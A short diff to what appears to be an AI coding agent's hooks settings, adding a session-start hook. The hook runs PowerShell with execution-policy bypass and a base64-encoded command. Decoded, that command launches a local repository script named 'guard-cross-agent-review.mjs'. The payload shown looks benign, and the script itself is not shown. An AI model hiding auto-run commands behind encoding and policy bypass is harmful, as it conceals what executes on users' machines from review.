@@ -63,6 +63,16 @@
     ],
     "SessionStart": [
       {
+        "matcher": "startup|resume",
+        "hooks": [
+          {
+            "type": "command",
+            "command": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABQAHIAbwBnAHIAZQBzAHMAUAByAGUAZgBlAHIAZQBuAGMAZQA9ACcAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAnADsAIABbAEMAbwBuAHMAbwBsAGUAXQA6ADoATwB1AHQAcAB1AHQARQBuAGMAbwBkAGkAbgBnAD0AWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAA7ACAAJgAgAG4AbwBkAGUAIAAoACgAZwBpAHQAIAByAGUAdgAtAHAAYQByAHMAZQAgAC0ALQBzAGgAbwB3AC0AdABvAHAAbABlAHYAZQBsACkALgBUAHIAaQBtACgAKQAgACsAIAAnAC8ALgBjAGwAYQB1AGQAZQAvAGgAbwBvAGsAcwAvAGcAdQBhAHIAZAAtAGMAcgBvAHMAcwAtAGEAZwBlAG4AdAAtAHIAZQB2AGkAZQB3AC4AbQBqAHMAJwApACAAYwBvAGQAZQB4AA==",
+            "timeout": 20
+          }
+        ]
+      },
+      {
         "matcher": "startup",
         "hooks": [
           {
